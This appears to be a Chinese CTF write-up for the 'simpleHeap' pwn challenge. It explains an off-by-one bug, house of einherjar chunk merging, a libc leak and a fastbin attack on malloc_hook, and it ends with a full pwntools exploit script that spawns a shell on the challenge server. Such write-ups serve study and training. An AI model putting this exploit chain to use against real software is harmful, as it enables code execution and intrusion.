# simpleHeap

## 来源
V&N


## 难度

4 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

功能齐全, 添加,删除,修改,打印.但是大小有限制 0 ~ 0x6F, 不能开辟small bin

## vul

```c
__int64 __fastcall inputContent(__int64 a1, int size)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)i;
    if ( i > size )               // off by one
      break;
    if ( !read(0, (void *)(i + a1), 1uLL) )
      exit(0);
    if ( *(_BYTE *)(i + a1) == 10 )
    {
      result = i + a1;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

编辑功能中存在off by one漏洞.

## 知识点

堆合并,堆分割,fastbin attack, off by one没有unsoted bin分配的另一种打法,基本上都差不多.

## 思路

通过off by one漏洞修改size为unsoted bin的size,注意这个size必须是chunk对其的size,不然释放检查会报错, 通过house of einherjar 合并堆快,在分割堆到下一个chunk泄漏libc,然后通过fastbin attack打入malloc_hook - 0x23处,注意fastbin attack的总体size 必须满足0x70,不然分配检查size 不符合也会报错.然后就是打one_gadget,realloc调整参数.



## 利用

### 准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './vn_pwn_simpleHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 26733

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('choice: ', str(1))
	sla('?', str(size))
	sa(':', data)

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sla(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla(':', str(5))	

```



### 布局

```python
	# idx 0 为了溢出修改chunk 1的size为small bin,
	#释放后fd和bk都是main_arena + 88,以便使用house of einherjar绕过unlink检查
    ad(0x68, 'A') 
 
	ad(0x48, 'C') # idx 1 为了house of einherjar能够合并堆块到此处
	ad(0x48, 'D') # idx 2 为了合并堆块后,能够溢出libc
	ad(0x68, 'E') # idx 3 后面采用此队块进行fastbin attack 打入malloc - 0x23处
	ad(0x68, 'F') # idx 4 采用此堆块来实现house of einherjar合并到 chunk 1

	ad(0x68, 'G') # idx 5 给 chunk 4 用的,因为house of einherjar需要的是small bin,也需要修改chunk 4的大小为samll bin size, 释放后, 这个堆块就会被占用. 防止top chunk 也把这个堆块给合并了,所以再开辟一个
	ad(0x68, 'G') # idx 6 防止top chunk 合并
```



### 实现unsoted bin

```python
	# 通过off by one漏洞实现修改下一个chunk 大小为small bin
	# 注意: 大小必须是chunk 的对其大小.意思就是 size = chunk1_size + chunk2_size + ....
	p = 'A' * 0x60
	p += p64(0x0)
	p += '\xa1' # chunk_1_size + chunk_2_size (0x50 + 0x50), 1代表前一个chunk inuse
	md(0, p) # 修改
	rm(1) # 释放实现获取unsoted bin以便在house of einherjar绕过unlink检查
```



### house of einherjar合并堆块

```python
	# house of eiherjar
	p = 'B' * 0x60
	p += p64(0x180 -0x70) # chunk 1到chunk 4的偏移
	p += '\xe0' #修改chunk 4 size 为small bin
	md(3, p)

	rm(3) # 在合并之前先释放掉 chunk 3,为后期fastbin attack作准备
	rm(4) # house of eiherjar合并chunk 4到chunk 1
```



### 泄漏libc

```python
	# unsorted bin split
	ad(0x48, 'A') #开辟0x48的堆,使main_arena信息跑到chunk 2中
	dp(2) # 前面没有释放该堆块,直接打印main_arena + 88地址

	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	li('main_arena ' + hex(main_arena))
	lib.address = main_arena - 0x3c4b20
	li('libc_base ' + hex(lib.address))
```



### astbin attack打入malloc_hook - 0x23

```python
	p = 'A' * 0x40
	p += p64(0)
	p += p64(0x71) #因为在malloc_hook  -0x23处的size为0x7f,所以bin要为0x70域,不然会检查失败.
	p += p64(main_arena - 0x33) # fastbin fd修改为malloc_hook - 0x23处
	ad(0x58, p) # 修改前面所释放掉的fastbin 信息.
    
	ad(0x68, 'A') # for ajust
```



### one_gadget

```python
	# modify malloc_hook and realloc_hook
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]
	p = '\x00' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 12) # 通过push次数调整execve第二个参数
	ad(0x68, p)
```



### get shell

```python
	# get shell
	sla('choice: ', str(1))
	sla('?', str(10))
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './vn_pwn_simpleHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 26733

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('choice: ', str(1))
	sla('?', str(size))
	sa(':', data)

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sla(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x68, 'A') # idx 0 heap

	ad(0x48, 'C') # idx 1 emerge top
	ad(0x48, 'D') # idx 2 for overlap
	ad(0x68, 'E') # idx 3 for fastbin attack
	ad(0x68, 'F') # idx 4 for house of einherjar

	ad(0x68, 'G') # idx 5 for not emerge to top chunk
	ad(0x68, 'G') # idx 6 for not emerge to top chunk
	
	# modify fastbin size as small bin size
	# Note: size must be aliened
	p = 'A' * 0x60
	p += p64(0x0)
	p += '\xa1'
	md(0, p)
	rm(1)

	# house of eiherjar
	p = 'B' * 0x60
	p += p64(0x180 -0x70)
	p += '\xe0'
	md(3, p)

	rm(3) # for fastbin attack
	rm(4) # emrge heap

	# unsorted bin split
	ad(0x48, 'A')
	dp(2)

	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	li('main_arena ' + hex(main_arena))
	lib.address = main_arena - 0x3c4b20
	li('libc_base ' + hex(lib.address))


	p = 'A' * 0x40
	p += p64(0)
	p += p64(0x71) # must be 71, or will check fail, because bin size as 70
	p += p64(main_arena - 0x33)
	ad(0x58, p)

	ad(0x68, 'A') # for ajust

	# modify malloc_hook and realloc_hook
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]
	p = '\x00' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 12)
	ad(0x68, p)

	# get shell
	sla('choice: ', str(1))
	sla('?', str(10))
	#db()


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''

```

